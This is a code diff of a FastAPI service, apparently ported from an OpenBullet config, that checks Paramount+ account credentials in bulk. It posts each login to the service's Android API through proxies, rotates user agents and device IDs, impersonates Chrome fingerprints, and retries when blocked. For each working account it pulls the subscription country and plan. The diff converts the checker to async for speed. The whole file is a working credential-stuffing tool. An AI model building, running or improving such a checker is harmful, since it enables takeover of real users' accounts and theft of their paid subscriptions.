@@ -1,15 +1,15 @@
+import asyncio
 import secrets
 import re
 from typing import Optional
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 from fake_useragent import UserAgent
-from curl_cffi import requests
+from curl_cffi.requests import AsyncSession  # Optimized Async Backend
 
-app = FastAPI(title="Paramount+ Serverless Auth API")
+app = FastAPI(title="Paramount+ Serverless Auth API Fast")
 ua = UserAgent()
 
-# Country mapping dictionary extracted from your script
 COUNTRY_MAP = {
     "AF": "Afganistan ", "AX": "Åland Islands ", "AL": "Albania ", "DZ": "Algeria ",
     "AS": "American Samoa ", "AD": "Andorra ", "AO": "Angola ", "AI": "Anguilla ",
@@ -84,7 +84,6 @@ class AuthRequest(BaseModel):
 
 
 def format_proxy(raw_proxy: str) -> Optional[dict]:
-    """Parses OpenBullet user:pass formats into curl_cffi compliant dict."""
     if not raw_proxy:
         return None
     match_userpass = re.match(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
@@ -101,7 +100,6 @@ def format_proxy(raw_proxy: str) -> Optional[dict]:
 
 
 def extract_json_value(source: str, left: str, right: str) -> str:
-    """Emulates OpenBullet left/right parsing syntax safely."""
     try:
         start = source.index(left) + len(left)
         end = source.index(right, start)
@@ -110,20 +108,26 @@ def extract_json_value(source: str, left: str, right: str) -> str:
         return ""
 
 
-def run_session_request(session: requests.Session, url: str, method: str, data: Optional[dict] = None, headers: Optional[dict] = None, proxies: Optional[dict] = None) -> tuple[int, str]:
-    """Executes network calls against target endpoints with automatic retry conditions."""
-    while True:
+async def run_session_request_async(session: AsyncSession, url: str, method: str, data: Optional[dict] = None, headers: Optional[dict] = None, proxies: Optional[dict] = None) -> tuple[int, str]:
+    """Executes network calls asynchronously with clean error retry ceilings."""
+    retries = 0
+    while retries < 5:
         try:
             if method == "POST":
-                resp = session.post(url, data=data, headers=headers, proxies=proxies, timeout=12)
+                resp = await session.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
             else:
-                resp = session.get(url, headers=headers, proxies=proxies, timeout=12)
+                resp = await session.get(url, headers=headers, proxies=proxies, timeout=10)
                 
             if resp.status_code in [500, 403, 406]:
+                retries += 1
+                await asyncio.sleep(0.2)
                 continue
             return resp.status_code, resp.text
         except Exception:
+            retries += 1
+            await asyncio.sleep(0.2)
             continue
+    return 0, ""
 
 
 @app.post("/auth")
@@ -132,7 +136,6 @@ async def authenticate(payload: AuthRequest):
     device_id = secrets.token_hex(8).lower()
     user_agent = ua.random
 
-    # Headers modified to replicate modern browser fingerprints natively via curl_cffi
     base_headers = {
         "Host": "www.intl.paramountplus.com",
         "Cookie": "CBS_DEVICEID=",
@@ -145,10 +148,10 @@ async def authenticate(payload: AuthRequest):
         "Accept-Language": "en-US,en;q=0.9"
     }
 
-    # Initialize session impersonating Android/Chrome ecosystem settings natively
-    with requests.Session(impersonate="chrome") as session:
+    # Asynchronous engine instance matching modern chrome profiles
+    async with AsyncSession(impersonate="chrome120") as session:
         
-        # Step 1: Login Check Execution
+        # Step 1: Login Verification
         login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
         login_headers = base_headers.copy()
         login_headers["Content-Type"] = "application/x-www-form-urlencoded"
@@ -159,25 +162,24 @@ async def authenticate(payload: AuthRequest):
             "deviceId": device_id
         }
 
-        status, source = run_session_request(session, login_url, "POST", data=body_data, headers=login_headers, proxies=proxies_dict)
+        status, source = await run_session_request_async(session, login_url, "POST", data=body_data, headers=login_headers, proxies=proxies_dict)
 
-        if "Invalid username/password pair" in source or '"status":400,"error":"Bad Request",' in source:
+        if not source or "Invalid username/password pair" in source or '"status":400,"error":"Bad Request",' in source:
             raise HTTPException(status_code=401, detail="Failure: Invalid Credentials")
         
         if "userId" not in source:
             raise HTTPException(status_code=400, detail="Failure: Unknown Response Structure")
 
-        # Step 2: Subscription Status Extraction
+        # Step 2: Details Capture
         status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
         status_headers = base_headers.copy()
         status_headers["Content-Type"] = "application/x-www-form-urlencoded"
 
-        status_code, status_source = run_session_request(session, status_url, "GET", headers=status_headers, proxies=proxies_dict)
+        status_code, status_source = await run_session_request_async(session, status_url, "GET", headers=status_headers, proxies=proxies_dict)
 
         if "NEW_FREE_PACKAGE" in status_source or '"planType":null,' in status_source:
             return {"status": "Custom/Free", "detail": "Account has no active premium package"}
 
-        # Parsing details (LR logic emulation)
         country_code = extract_json_value(status_source, '"subscriptionCountry":"', '"')
         plan = extract_json_value(status_source, '"productName":"', '"')
         plan_type = extract_json_value(status_source, '"planType":"', '"')
